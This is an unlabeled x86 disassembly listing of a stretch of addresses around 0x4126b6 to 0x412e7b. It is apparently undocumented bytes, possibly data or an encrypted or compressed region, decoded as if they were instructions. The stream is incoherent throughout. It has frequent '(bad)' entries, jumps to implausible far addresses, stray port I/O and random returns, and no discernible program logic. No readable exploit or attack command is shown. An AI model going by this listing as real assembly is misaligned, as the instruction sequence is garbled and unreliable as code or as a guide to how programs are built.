  4126b6:	rcl    BYTE PTR [edx+0x5a896da5],0x5a
  4126bd:	je     0x4126d4
  4126bf:	xchg   DWORD PTR [ebx],ecx
  4126c1:	push   ebx
  4126c2:	xor    BYTE PTR [ecx+0x7fc794ae],ch
  4126c8:	aad    0xe9
  4126ca:	add    bl,BYTE PTR [eax+0x2]
  4126cd:	ror    DWORD PTR [ecx],1
  4126cf:	ja     0x41267f
  4126d1:	or     BYTE PTR [edx],0xb
  4126d4:	sar    DWORD PTR [edx+0x1a],1
  4126d7:	inc    ecx
  4126d8:	fisub  DWORD PTR [edi+0x73ea5939]
  4126de:	in     eax,0xfd
  4126e0:	inc    esp
  4126e1:	jg     0x4126af
  4126e3:	adc    ch,BYTE PTR [edi]
  4126e5:	scas   eax,DWORD PTR es:[edi]
  4126e6:	mov    esp,0x9779d56b
  4126eb:	push   edi
  4126ec:	push   edx
  4126ed:	jno    0x412677
  4126ef:	ret    0x5fa1
  4126f2:	sub    eax,0xd915c047
  4126f7:	iret   
  4126f8:	mov    ch,0x89
  4126fa:	popa   
  4126fb:	and    esi,ebx
  4126fd:	fsubr  QWORD PTR [edi-0x2c348c30]
  412703:	jg     0x412715
  412705:	jmp    0xfe4d9201
  41270a:	lahf   
  41270b:	push   ds
  41270c:	cmp    BYTE PTR [esi+0x28928b76],cl
  412712:	sub    DWORD PTR [eax],edx
  412714:	retf   
  412715:	mov    WORD PTR ds:0x702e1ff0,ss
  41271b:	cs clc 
  41271d:	adc    al,0x1b
  41271f:	jl     0x4126a1
  412721:	sub    dh,BYTE PTR [ecx-0x75]
  412724:	inc    eax
  412725:	stos   BYTE PTR es:[edi],al
  412726:	dec    ebp
  412727:	lds    edi,FWORD PTR [edi+0x119a63cd]
  41272d:	pop    edx
  41272e:	aas    
  41272f:	outs   dx,BYTE PTR ds:[esi]
  412730:	ja     0x4126cd
  412732:	lods   al,BYTE PTR ds:[esi]
  412733:	retf   0xd349
  412736:	clc    
  412737:	inc    edi
  412738:	add    ah,bl
  41273a:	stos   DWORD PTR es:[edi],eax
  41273b:	rcr    BYTE PTR [ecx+0x28],0xe4
  41273f:	fisub  DWORD PTR [eax-0x1d]
  412742:	(bad)  
  412743:	and    dl,BYTE PTR [esi]
  412745:	xor    BYTE PTR [ebp+ebp*2-0x72],ch
  412749:	leave  
  41274a:	das    
  41274b:	and    ecx,DWORD PTR [ebp-0x54fe59cf]
  412751:	jnp    0x4126e3
  412753:	add    cl,cl
  412755:	les    edx,FWORD PTR [ebx]
  412757:	loope  0x41273b
  412759:	fist   WORD PTR [ecx]
  41275b:	test   eax,0xc6f2ff8c
  412760:	sbb    al,0x60
  412762:	mov    ecx,esp
  412764:	out    dx,eax
  412765:	iret   
  412766:	jmp    0x334ee807
  41276b:	fwait
  41276c:	test   DWORD PTR ds:0xd163ff4c,edi
  412772:	or     ebx,DWORD PTR [edx+0x71]
  412775:	mov    bx,0xd7ea
  412779:	repnz nop
  41277b:	add    bh,al
  41277d:	jmp    0x41278a
  41277f:	pushf  
  412780:	daa    
  412781:	xor    eax,0xad2a3142
  412786:	adc    eax,0x576a7be9
  41278b:	fwait
  41278c:	jbe    0x412747
  41278e:	push   ds
  41278f:	mov    eax,ds:0x4bb4aa42
  412794:	xchg   esp,eax
  412795:	mov    esi,0x219d1153
  41279a:	call   0xd8de2d66
  41279f:	or     al,0xda
  4127a1:	sub    DWORD PTR cs:[eax],ebp
  4127a4:	das    
  4127a5:	inc    ebx
  4127a6:	aad    0x91
  4127a8:	aas    
  4127a9:	sub    al,0x5b
  4127ab:	daa    
  4127ac:	or     ah,BYTE PTR [ecx+0x6f73aca9]
  4127b2:	clc    
  4127b3:	cmp    eax,0x2a7b62b5
  4127b8:	xchg   ecx,eax
  4127b9:	dec    edi
  4127ba:	scas   eax,DWORD PTR es:[edi]
  4127bb:	or     BYTE PTR [ecx-0x64],bl
  4127be:	std    
  4127bf:	mov    WORD PTR [ecx+edi*2+0x55cc924e],ds
  4127c6:	ret    0xaf28
  4127c9:	rcl    bl,0xdd
  4127cc:	bound  edx,QWORD PTR [ebx+0x557c9c70]
  4127d2:	sbb    DWORD PTR [edi+0x36],ebx
  4127d5:	add    al,0x75
  4127d7:	xchg   edx,eax
  4127d8:	and    eax,DWORD PTR [eax+0x59]
  4127db:	cs int3 
  4127dd:	jge    0x4127df
  4127df:	stc    
  4127e0:	rol    DWORD PTR [esp+eax*1+0x27],0xc6
  4127e5:	xor    DWORD PTR [edi-0x706f6fdc],esp
  4127eb:	and    cl,bh
  4127ed:	jl     0x412805
  4127ef:	xchg   esi,eax
  4127f0:	add    DWORD PTR [ecx],ebp
  4127f2:	aam    0x61
  4127f4:	outs   dx,WORD PTR ss:[esi]
  4127f7:	sub    DWORD PTR [ebp+0x11],edx
  4127fa:	add    al,0x5f
  4127fc:	int3   
  4127fd:	mov    edx,DWORD PTR [ecx+0x1d]
  412800:	pop    esi
  412801:	jp     0x4127ba
  412803:	mov    dl,0xab
  412805:	sub    BYTE PTR [ebp+0x25],0x5e
  412809:	loope  0x4127bc
  41280b:	in     al,0x24
  41280d:	jmp    0x6db5:0x3061451d
  412814:	(bad)  
  412815:	cmp    ah,BYTE PTR [edx+0x4e548e9c]
  41281b:	sti    
  41281c:	pop    edi
  41281d:	(bad)  
  41281e:	ftst   
  412820:	mov    ecx,0xa51d1939
  412825:	(bad)  
  412826:	mov    ah,0x55
  412828:	movd   DWORD PTR [esi+0x48],mm5
  41282c:	in     al,dx
  41282d:	dec    ebp
  41282e:	arpl   WORD PTR [ebx+0x2f],dx
  412831:	pushf  
  412832:	xlat   BYTE PTR ds:[ebx]
  412833:	mov    ecx,0x2a411e7
  412838:	inc    edx
  412839:	into   
  41283a:	shr    DWORD PTR ds:0xa205ae70,1
  412840:	jmp    0x45e982e6
  412845:	in     eax,0xa4
  412847:	test   DWORD PTR [edx],ebp
  412849:	lods   eax,DWORD PTR ds:[esi]
  41284a:	sbb    DWORD PTR [ecx],eax
  41284c:	cld    
  41284d:	lea    edx,[eax+0x6486e8e7]
  412853:	and    edi,DWORD PTR ds:0xe2152f
  412859:	test   eax,0xdf4a1e8e
  41285e:	mov    ah,0xf7
  412860:	jno    0x41284b
  412862:	pushf  
  412863:	fs and ecx,edi
  412866:	inc    ebx
  412867:	adc    eax,0x4c78ae15
  41286c:	fistp  QWORD PTR [ecx]
  41286e:	(bad)  
  41286f:	int    0x27
  412871:	push   ebp
  412872:	ds cmp eax,0x9f5bfba3
  412878:	imul   ebx,ebx,0x63
  41287b:	fisubr WORD PTR [ebx-0x6b95e3da]
  412881:	sbb    eax,0x51090dd5
  412886:	jp     0x412831
  412888:	push   edx
  412889:	jmp    0x4928:0x88ce467d
  412890:	and    DWORD PTR [edx+0x1a],esi
  412893:	mov    ds:0x6101af07,al
  412898:	dec    eax
  412899:	jo     0x4128e8
  41289b:	pop    eax
  41289c:	inc    ecx
  41289d:	push   ss
  41289e:	dec    edi
  41289f:	and    DWORD PTR [ebx+ebp*4+0x7ba10550],esi
  4128a6:	bound  ecx,QWORD PTR [ecx+0x48970031]
  4128ac:	test   dh,cl
  4128ae:	mov    edi,0x1f31d02c
  4128b3:	cmp    ebp,edi
  4128b5:	push   esi
  4128b6:	sub    BYTE PTR [esi-0x624efe34],ch
  4128bc:	cdq    
  4128bd:	shr    BYTE PTR [edx],cl
  4128bf:	dec    esi
  4128c0:	leave  
  4128c1:	mov    al,0x10
  4128c3:	or     edx,esp
  4128c5:	test   al,0x5f
  4128c7:	xchg   ebx,eax
  4128c8:	mov    WORD PTR ds:0x2aff25e,ds
  4128ce:	pushf  
  4128cf:	mov    DWORD PTR [esi],0x2465299e
  4128d5:	xchg   ebp,eax
  4128d6:	dec    edi
  4128d7:	push   esi
  4128d8:	dec    DWORD PTR [esi+0x69]
  4128db:	dec    ebp
  4128dc:	into   
  4128dd:	xor    ch,cl
  4128df:	push   es
  4128e0:	inc    esi
  4128e1:	xor    dh,dl
  4128e3:	push   esp
  4128e4:	test   eax,0x44e027da
  4128e9:	sub    cl,dl
  4128eb:	loope  0x4128c4
  4128ed:	dec    esi
  4128ee:	xor    eax,0x1763daf0
  4128f3:	das    
  4128f4:	inc    ebx
  4128f5:	cmp    DWORD PTR [edx-0x76],edx
  4128f8:	pop    esi
  4128f9:	loope  0x412906
  4128fb:	jnp    0x4128ab
  4128fd:	sahf   
  4128fe:	in     eax,0x1b
  412900:	sub    BYTE PTR [esi],al
  412902:	aaa    
  412903:	cdq    
  412904:	loopne 0x4128d9
  412906:	std    
  412907:	ds sbb ah,bl
  41290a:	arpl   WORD PTR [edi],di
  41290c:	fwait
  41290d:	and    al,0x33
  41290f:	inc    ecx
  412910:	mov    bl,0x57
  412912:	push   ss
  412913:	std    
  412914:	sub    al,0x40
  412917:	adc    bh,BYTE PTR [ecx]
  412919:	and    al,0x1d
  41291b:	aam    0x34
  41291d:	adc    DWORD PTR [ecx+eiz*2+0x27076678],edi
  412924:	test   al,0x73
  412926:	out    0x1c,eax
  412928:	pop    ds
  412929:	fisub  WORD PTR [esi-0x7c]
  41292c:	ins    BYTE PTR es:[edi],dx
  41292d:	adc    al,0x63
  41292f:	lods   eax,DWORD PTR ds:[esi]
  412930:	push   ss
  412931:	sbb    eax,0xfdaaa3b8
  412936:	xchg   ecx,eax
  412937:	mov    DWORD PTR [ebp-0x1ef6cc2f],edi
  41293d:	sub    dh,ah
  41293f:	and    al,0x8b
  412941:	stos   BYTE PTR es:[edi],al
  412942:	adc    dh,BYTE PTR [edi+0x689f9187]
  412948:	repz out 0xf4,eax
  41294b:	lahf   
  41294c:	iret   
  41294d:	mov    esi,0xe4b30d8
  412952:	cmc    
  412953:	out    dx,eax
  412954:	mov    bh,0x9d
  412956:	imul   ecx,eax,0xffffffa5
  412959:	xor    DWORD PTR [edx],eax
  41295b:	fisttp DWORD PTR [edx-0xb5084d3]
  412961:	mov    ds:0xd411b669,eax
  412966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412967:	(bad)  
  412968:	popf   
  412969:	cmp    BYTE PTR [esi-0x64ac656b],cl
  41296f:	popa   
  412970:	sbb    ecx,esi
  412972:	jmp    0x41290d
  412974:	sub    ah,BYTE PTR [edi+0x56f931c1]
  41297a:	jo     0x412934
  41297c:	mov    BYTE PTR [eax+0x26142f6b],ch
  412982:	adc    edi,edi
  412984:	xor    DWORD PTR [ebp+0x475a2614],ebx
  41298a:	ror    BYTE PTR [edi-0x4c],0x4f
  41298e:	nop
  41298f:	inc    esi
  412990:	bound  esi,QWORD PTR [edi+esi*1+0x75]
  412994:	inc    ecx
  412995:	cmp    DWORD PTR [eax+0x7deccf84],0x35
  41299c:	sbb    al,0xd6
  41299e:	push   ecx
  41299f:	adc    al,0x51
  4129a1:	in     al,dx
  4129a2:	inc    ebp
  4129a3:	sub    ah,bh
  4129a5:	mov    ah,0xf9
  4129a7:	ja     0x4129eb
  4129a9:	pop    ds
  4129aa:	dec    eax
  4129ab:	add    BYTE PTR [ebp-0x547d7231],bh
  4129b1:	push   eax
  4129b2:	pop    edi
  4129b3:	in     al,0x30
  4129b5:	xchg   ebx,eax
  4129b6:	pop    esi
  4129b7:	dec    eax
  4129b8:	push   0xffffff99
  4129ba:	in     eax,dx
  4129bb:	inc    ecx
  4129bc:	push   es
  4129bd:	push   ss
  4129be:	retf   0x5fc
  4129c1:	mov    ebx,0x68e0faa5
  4129c6:	(bad)  
  4129c7:	fcomp  QWORD PTR [ebx-0x1551fe05]
  4129cd:	push   ebx
  4129ce:	cmp    DWORD PTR [edi],0xffffffdd
  4129d1:	jno    0x412a19
  4129d3:	retf   0x770d
  4129d6:	mov    bh,0x9e
  4129d8:	xor    BYTE PTR [eax],0x23
  4129db:	(bad)  
  4129dc:	push   esi
  4129dd:	and    bl,BYTE PTR [esi-0x23]
  4129e0:	out    dx,eax
  4129e1:	or     DWORD PTR [ecx-0x27],edx
  4129e4:	arpl   WORD PTR [edi],bp
  4129e6:	add    esp,DWORD PTR [eax+eiz*8+0x23]
  4129ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129eb:	ret    0xeb4
  4129ee:	push   0xffffffa8
  4129f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129f1:	jae    0x412a44
  4129f3:	sbb    DWORD PTR [ecx],esi
  4129f5:	and    bh,BYTE PTR [ecx-0x3c]
  4129f8:	dec    edx
  4129f9:	iret   
  4129fa:	imul   esi,DWORD PTR [edx],0xffffffba
  4129fd:	dec    ecx
  4129fe:	scas   eax,DWORD PTR es:[edi]
  4129ff:	outs   dx,DWORD PTR ds:[esi]
  412a00:	and    ebp,DWORD PTR [eax+0x372e0e2d]
  412a06:	sbb    dl,BYTE PTR [ebp-0x6d]
  412a09:	jge    0x412a15
  412a0b:	into   
  412a0c:	out    dx,eax
  412a0d:	jp     0x4129fc
  412a0f:	xchg   ebx,eax
  412a10:	scas   eax,DWORD PTR es:[edi]
  412a11:	add    edx,DWORD PTR [eax]
  412a13:	cdq    
  412a14:	mov    bl,0x6
  412a16:	mov    ch,0xe4
  412a18:	outs   dx,DWORD PTR ds:[esi]
  412a19:	and    DWORD PTR [edi+0x34],edx
  412a1c:	mov    ecx,0x1d7da7
  412a21:	xor    DWORD PTR [eax],ecx
  412a23:	shl    BYTE PTR [ecx+edx*1-0x64438ebd],1
  412a2a:	mov    ds:0x547bdab9,al
  412a2f:	fwait
  412a30:	jge    0x412a18
  412a32:	mov    ds:0x58fb62d0,eax
  412a37:	mov    ebp,?
  412a39:	push   edi
  412a3a:	inc    esi
  412a3b:	bound  edx,QWORD PTR [edx]
  412a3d:	cdq    
  412a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a3f:	and    edi,eax
  412a41:	push   es
  412a42:	imul   ebx,DWORD PTR [edi+0x3bb7031f],0x6e
  412a49:	mov    eax,0x6e3b984f
  412a4e:	stc    
  412a4f:	retf   0x600b
  412a52:	mov    ah,0xda
  412a54:	idiv   BYTE PTR ds:0x7027715b
  412a5a:	out    dx,eax
  412a5b:	inc    esi
  412a5c:	pop    ebp
  412a5d:	call   0x7cbacb6c
  412a62:	stos   BYTE PTR es:[edi],al
  412a63:	xor    al,0xe0
  412a65:	pop    esi
  412a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a67:	fmul   QWORD PTR [esi]
  412a69:	popf   
  412a6a:	adc    al,0xab
  412a6c:	sar    DWORD PTR [edx+0x40607537],0xde
  412a73:	and    BYTE PTR [eax+0x33],dl
  412a76:	adc    BYTE PTR [esi],bh
  412a78:	neg    DWORD PTR [edi]
  412a7a:	faddp  st(2),st
  412a7c:	inc    edi
  412a7d:	mov    bl,0xc1
  412a7f:	mov    ch,BYTE PTR [edi-0x5d]
  412a82:	jp     0x412a26
  412a84:	sbb    DWORD PTR [ebp+0x33],esi
  412a87:	test   BYTE PTR [ecx],al
  412a89:	cmc    
  412a8a:	inc    esp
  412a8b:	daa    
  412a8c:	out    dx,al
  412a8d:	mov    ebx,0x59258537
  412a92:	sub    al,0x84
  412a94:	fcomi  st,st(4)
  412a96:	cmp    esp,DWORD PTR [esp+ebx*4-0x4a]
  412a9a:	test   DWORD PTR [eax-0x6141cfa0],esi
  412aa0:	mov    esp,0xa5abd69f
  412aa5:	mov    ds:0x262a9e90,al
  412aaa:	mov    ah,0x4b
  412aac:	cs enter 0x1de1,0xf5
  412ab1:	(bad)  
  412ab2:	sbb    eax,0x229662be
  412ab7:	fimul  DWORD PTR [ecx+0x10]
  412aba:	out    dx,al
  412abb:	lahf   
  412abc:	sbb    al,0xff
  412abe:	jne    0x412aa8
  412ac0:	jmp    0x412fcb
  412ac5:	ror    ebp,0xd6
  412ac8:	(bad)  
  412ac9:	fcmovbe st,st(5)
  412acb:	rcr    ecx,0xdb
  412ace:	mov    ds:0x818ed96e,al
  412ad3:	js     0x412a8c
  412ad5:	push   ds
  412ad6:	or     DWORD PTR [edi+0x78],edi
  412ad9:	push   0x7c
  412adb:	js     0x412b55
  412add:	mov    eax,0x6f8636f0
  412ae2:	fldcw  WORD PTR [ebp-0x7fa1906b]
  412ae8:	int3   
  412ae9:	push   edi
  412aea:	xor    esp,DWORD PTR [esi+eiz*4-0x106983b2]
  412af1:	xcrypt-ecb (bad)
  412af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412af3:	dec    ebp
  412af4:	jae    0x412aa9
  412af6:	pop    ecx
  412af7:	inc    ebx
  412af8:	pushf  
  412af9:	jnp    0x412b0a
  412afb:	mov    dh,0xc1
  412afd:	in     al,0x4
  412aff:	in     eax,dx
  412b00:	es popf 
  412b02:	xchg   DWORD PTR [ecx+0x26],esi
  412b05:	iret   
  412b06:	xchg   DWORD PTR [esi+eax*8],edi
  412b09:	mov    ds:0x82b1432c,eax
  412b0e:	sub    eax,0x10f2479b
  412b13:	shl    DWORD PTR [esp+ebp*4],1
  412b16:	inc    eax
  412b17:	push   ebx
  412b18:	fimul  WORD PTR ds:0xc9d7044c
  412b1e:	sub    al,0xea
  412b20:	or     al,0xa
  412b22:	(bad)  
  412b23:	cld    
  412b24:	fist   DWORD PTR [eax]
  412b26:	dec    eax
  412b27:	test   bh,0x10
  412b2a:	lods   al,BYTE PTR ds:[esi]
  412b2b:	push   ss
  412b2c:	or     eax,0x974cf1bc
  412b31:	jo     0x412b8b
  412b33:	je     0x412b83
  412b35:	xchg   edx,eax
  412b36:	push   ecx
  412b37:	cmp    edx,0x9dccccf5
  412b3d:	rol    DWORD PTR [esi],0x5d
  412b40:	mov    ds:0xa0efdfb6,al
  412b45:	push   esp
  412b46:	inc    eax
  412b47:	xchg   edx,eax
  412b48:	les    edx,FWORD PTR [eax-0x7ff2090]
  412b4e:	fdiv   QWORD PTR [eax+esi*4]
  412b51:	pusha  
  412b52:	mov    edi,0x47792e3c
  412b57:	fidivr DWORD PTR [edi+0x6949bcc9]
  412b5d:	xchg   ebx,eax
  412b5e:	ficomp WORD PTR [ebp+0x39e70f8a]
  412b64:	(bad)  
  412b65:	cld    
  412b66:	push   esp
  412b67:	out    dx,eax
  412b68:	data16 mov bl,0x7d
  412b6b:	ss dec esp
  412b6d:	mov    ah,0xe2
  412b6f:	dec    BYTE PTR [edi-0x14]
  412b72:	nop    DWORD PTR [esi]
  412b75:	mov    esp,DWORD PTR [ebp+0x321f6a12]
  412b7b:	sahf   
  412b7c:	inc    eax
  412b7d:	iret   
  412b7e:	sub    DWORD PTR [ebx+edx*8-0x18362a28],ebx
  412b85:	mov    ebp,0x698c2512
  412b8a:	and    bl,bl
  412b8c:	test   eax,0xc3876166
  412b91:	inc    esi
  412b92:	and    BYTE PTR [edi],bh
  412b94:	(bad)  
  412b95:	stc    
  412b96:	es ret 0xe9df
  412b9a:	mov    ebx,0xd4586013
  412b9f:	push   ebx
  412ba0:	mov    al,ds:0xd0c39db2
  412ba5:	daa    
  412ba6:	or     BYTE PTR [ebp+0x37eb4a40],dl
  412bac:	cld    
  412bad:	adc    eax,0xc42504fe
  412bb2:	mov    al,ds:0x76befdd1
  412bb7:	or     ebx,DWORD PTR [ecx+0x55]
  412bba:	add    BYTE PTR [edx-0x19],dh
  412bbd:	push   edx
  412bbe:	dec    edi
  412bbf:	push   ss
  412bc0:	xchg   DWORD PTR [eax],ebx
  412bc2:	mov    eax,0xc8a4d51c
  412bc7:	call   0xba9d44f9
  412bcc:	fsubr  DWORD PTR [ebx]
  412bce:	mov    ah,0xbe
  412bd0:	pop    ebp
  412bd1:	in     al,dx
  412bd2:	aaa    
  412bd3:	push   0xd22ca1a3
  412bd8:	aam    0xdc
  412bda:	sti    
  412bdb:	push   esp
  412bdc:	lods   eax,DWORD PTR ds:[esi]
  412bdd:	push   esi
  412bde:	or     al,0x48
  412be0:	sub    edi,edx
  412be2:	mov    edx,0xb32ac0fc
  412be7:	add    esp,DWORD PTR ds:0xeb157076
  412bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bee:	mov    ds:0x19dc6576,eax
  412bf3:	(bad)  
  412bf4:	outs   dx,BYTE PTR ds:[esi]
  412bf5:	pusha  
  412bf6:	or     bh,dh
  412bf8:	push   0xe7d50209
  412bfd:	stc    
  412bfe:	rol    ah,1
  412c00:	in     eax,0x57
  412c02:	pop    ecx
  412c03:	iret   
  412c04:	jbe    0x412bd4
  412c06:	pop    eax
  412c07:	(bad)  
  412c08:	sahf   
  412c09:	stos   BYTE PTR es:[edi],al
  412c0a:	shl    bh,0x64
  412c0d:	aam    0xd0
  412c0f:	jnp    0x412b9f
  412c11:	mov    ah,0x75
  412c13:	sbb    edi,esi
  412c15:	cmp    al,0x7a
  412c17:	mov    ds:0xa7e2881e,eax
  412c1c:	leave  
  412c1d:	pop    ecx
  412c1e:	popa   
  412c1f:	mov    db7,esi
  412c22:	xchg   ebx,eax
  412c23:	test   al,bl
  412c25:	dec    eax
  412c26:	xchg   esi,eax
  412c27:	adc    eax,ecx
  412c29:	fistp  DWORD PTR [ecx+0x15cee518]
  412c2f:	mov    esi,0xb855ba21
  412c34:	aam    0xd3
  412c36:	adc    edi,DWORD PTR [ebx]
  412c38:	and    dh,ch
  412c3a:	loop   0x412c62
  412c3c:	mov    ebp,0xcaee49e0
  412c41:	cmc    
  412c42:	mov    ebp,0x88d222f9
  412c47:	pop    ebp
  412c48:	jp     0x412c55
  412c4a:	fcom   DWORD PTR [eax-0x2f]
  412c4d:	adc    al,BYTE PTR [esp+edx*1]
  412c50:	xchg   esp,eax
  412c51:	int3   
  412c52:	pop    edi
  412c53:	jne    0x412bef
  412c55:	adc    eax,0xe37f177
  412c5a:	sub    ebp,DWORD PTR [ebx]
  412c5c:	mov    edi,0xd6ac7b34
  412c61:	out    dx,al
  412c62:	test   DWORD PTR [eax-0x1f86c5eb],esi
  412c68:	ss loopne 0x412c34
  412c6b:	xor    al,BYTE PTR [ecx-0x7b89c6db]
  412c71:	scas   eax,DWORD PTR es:[edi]
  412c72:	cmp    cl,dh
  412c74:	add    edi,DWORD PTR [ecx]
  412c76:	test   al,0xb5
  412c78:	(bad)  
  412c79:	test   DWORD PTR [esp+eiz*2],esi
  412c7c:	push   edx
  412c7d:	adc    BYTE PTR [ecx-0x5ec40a5],bh
  412c83:	shr    DWORD PTR [eax+0x65],1
  412c86:	mov    DWORD PTR [edx+0x6beb8539],esi
  412c8c:	pop    ebx
  412c8d:	ja     0x412c5d
  412c8f:	add    DWORD PTR [edx-0x3e],esp
  412c92:	je     0x412c56
  412c94:	stos   DWORD PTR es:[edi],eax
  412c95:	dec    esi
  412c96:	mov    DWORD PTR [edx-0x1a],eax
  412c99:	or     DWORD PTR [ecx+0x6f],esi
  412c9c:	aam    0xf
  412c9e:	imul   ecx,DWORD PTR [ebp-0xa],0xffffffbb
  412ca2:	(bad)  
  412ca3:	adc    al,0xa
  412ca5:	or     BYTE PTR [edx-0x56],0x22
  412ca9:	pop    ebx
  412caa:	mov    ch,0xa4
  412cac:	int3   
  412cad:	mov    DWORD PTR [edi+0x11],ebx
  412cb0:	push   0xffffffe0
  412cb2:	in     al,dx
  412cb3:	or     al,bl
  412cb5:	leave  
  412cb6:	pop    es
  412cb7:	jb     0x412c60
  412cb9:	mov    cl,0x87
  412cbb:	enter  0xd35e,0x24
  412cbf:	mov    bh,0x7
  412cc1:	inc    edi
  412cc2:	add    al,0x44
  412cc4:	cli    
  412cc5:	or     eax,0xf0da117e
  412cca:	(bad)  
  412ccb:	in     al,0x9
  412ccd:	add    bh,ah
  412ccf:	scas   al,BYTE PTR es:[edi]
  412cd0:	mov    ds:0x21243eb,al
  412cd5:	mov    eax,ds:0xa6fbc61b
  412cda:	int    0xe6
  412cdc:	sub    ebx,ecx
  412cde:	stos   BYTE PTR es:[edi],al
  412cdf:	cmp    BYTE PTR [eax-0x3a876cbb],al
  412ce5:	sbb    eax,DWORD PTR [eax]
  412ce7:	sar    BYTE PTR [edi],cl
  412ce9:	mov    al,0xe3
  412ceb:	jo     0x412cbb
  412ced:	daa    
  412cee:	imul   ecx,DWORD PTR [ebp-0x81e0813],0x2c6628e5
  412cf8:	ror    edx,cl
  412cfa:	and    ch,BYTE PTR [ebx-0x3d2a5998]
  412d00:	jp     0x412ce8
  412d02:	arpl   WORD PTR [ebx-0x4d6015da],cx
  412d08:	lock cmp dh,BYTE PTR [ebx-0x125aa081]
  412d0f:	mov    esp,0x42c5c65d
  412d14:	std    
  412d15:	stc    
  412d16:	pop    es
  412d17:	push   esp
  412d18:	jle    0x412d22
  412d1a:	add    BYTE PTR [esi],bl
  412d1c:	fadd   QWORD PTR [ebp-0x156f63f7]
  412d22:	jno    0x412d00
  412d24:	call   0xd91a:0x8398cc26
  412d2b:	sub    BYTE PTR [edi],ch
  412d2d:	sub    ecx,DWORD PTR [edi+esi*2-0x2684d0f3]
  412d34:	cmp    al,0x33
  412d36:	ret    0xd711
  412d39:	jns    0x412cde
  412d3b:	xor    ebx,DWORD PTR [ecx-0x38d53731]
  412d41:	mov    ecx,0xb793d7e4
  412d46:	sub    DWORD PTR [esi-0x3ffcd8d4],ebx
  412d4c:	mov    al,ds:0x301729d8
  412d51:	jecxz  0x412d24
  412d53:	jae    0x412d4a
  412d55:	dec    esp
  412d56:	adc    al,0xb4
  412d58:	jnp    0x412db9
  412d5a:	pushf  
  412d5b:	xor    esi,DWORD PTR [edx+0x2be4d0c6]
  412d61:	dec    ecx
  412d62:	cmp    DWORD PTR [edi+eiz*1-0x4],ebx
  412d66:	scas   al,BYTE PTR es:[edi]
  412d67:	mov    ah,0xcd
  412d69:	cmovge ebp,eax
  412d6c:	add    dh,BYTE PTR [ecx+edi*2+0x7a49e17b]
  412d73:	enter  0x42ef,0xe5
  412d77:	add    DWORD PTR [ecx+eiz*2],0xffffffe2
  412d7b:	test   DWORD PTR [ecx+0x4e],eax
  412d7e:	inc    eax
  412d7f:	mov    eax,0xdcfab781
  412d84:	(bad)  
  412d85:	into   
  412d86:	sbb    ch,bl
  412d88:	cmp    BYTE PTR [eax-0x46734475],cl
  412d8e:	inc    ebx
  412d8f:	push   0xffffffb8
  412d91:	push   edi
  412d92:	and    bl,BYTE PTR [esi-0x43]
  412d95:	mov    esp,0xbf4bd6da
  412d9a:	xor    ah,bh
  412d9c:	adc    edx,edi
  412d9e:	test   eax,0xba6747fe
  412da3:	add    dl,dl
  412da5:	fldcw  WORD PTR [ebx+0x2b]
  412da8:	shl    cl,1
  412daa:	inc    DWORD PTR [ebx]
  412dac:	or     edx,DWORD PTR [edx]
  412dae:	and    DWORD PTR [edx+0x5f],0x4221c4c8
  412db5:	cmp    BYTE PTR [edx+0x7b],bh
  412db8:	sub    al,0x3f
  412dba:	lahf   
  412dbb:	mov    eax,ds:0x9ec2c6a
  412dc0:	scas   al,BYTE PTR es:[edi]
  412dc1:	add    eax,0x7462ec43
  412dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dc7:	pop    ss
  412dc8:	test   al,0xba
  412dca:	jp     0x412d58
  412dcc:	add    eax,DWORD PTR [ecx]
  412dce:	paddsw mm6,mm2
  412dd1:	mov    ds:0x902b89c6,al
  412dd6:	fcomp  QWORD PTR [ebp+0x30]
  412dd9:	ds in  al,0xc6
  412ddc:	jno    0x412e3c
  412dde:	test   DWORD PTR [edx+ebp*2-0x1bc7bca9],esp
  412de5:	sbb    al,BYTE PTR [edx+0xe08f437]
  412deb:	or     BYTE PTR [ebp-0x16ccfaed],al
  412df1:	push   ss
  412df2:	or     DWORD PTR [esi+esi*8],esp
  412df5:	mov    al,BYTE PTR [ebp-0x27]
  412df8:	jle    0x412dac
  412dfa:	aad    0x70
  412dfc:	bound  esp,QWORD PTR [ebp-0x6]
  412dff:	in     al,0xf5
  412e01:	out    dx,eax
  412e02:	sahf   
  412e03:	pop    edi
  412e04:	cmp    ch,BYTE PTR [edi-0x2a]
  412e07:	mov    ds:0xec7f835b,al
  412e0c:	fwait
  412e0d:	pop    ecx
  412e0e:	add    DWORD PTR [esi+0x16],esi
  412e11:	fld    DWORD PTR [esi+0x38]
  412e14:	xchg   ecx,eax
  412e15:	les    eax,FWORD PTR [edx+ebx*4+0x4144195]
  412e1c:	arpl   WORD PTR [ebx],bx
  412e1e:	(bad)  
  412e20:	mov    al,0xd6
  412e22:	pushf  
  412e23:	jl     0x412e2b
  412e25:	cmp    esi,DWORD PTR [edx]
  412e27:	xor    eax,0xc72a9e53
  412e2c:	add    ecx,edx
  412e2e:	dec    edx
  412e2f:	xlat   BYTE PTR ds:[ebx]
  412e30:	mov    dh,0xde
  412e32:	fiadd  WORD PTR [eax-0x4c]
  412e35:	dec    edi
  412e36:	inc    ebp
  412e37:	retf   0xb2a9
  412e3a:	and    eax,0x55391616
  412e3f:	in     eax,0x83
  412e41:	add    DWORD PTR [ebp-0x80],0x99844cb2
  412e48:	icebp  
  412e49:	mov    cl,0x95
  412e4b:	xchg   ebp,eax
  412e4c:	pop    ecx
  412e4d:	int3   
  412e4e:	stos   BYTE PTR es:[edi],al
  412e4f:	rol    BYTE PTR [ecx-0x7a],0x29
  412e53:	pop    edi
  412e54:	push   ds
  412e55:	setne  BYTE PTR [ebp-0x880cbae]
  412e5c:	(bad)  
  412e5d:	fisttp DWORD PTR [esi-0x49]
  412e60:	pop    edx
  412e61:	xor    esp,edi
  412e63:	(bad)
  412e66:	retf   0xc141
  412e69:	icebp  
  412e6a:	fisttp WORD PTR [edi+0x49]
  412e6d:	pop    edx
  412e6e:	sahf   
  412e6f:	dec    esi
  412e70:	cmp    ebx,DWORD PTR [eax+0x5ad49094]
  412e76:	repnz cdq 
  412e78:	pop    ecx
  412e79:	out    dx,eax
  412e7a:	inc    ebp
  412e7b:	push   esp
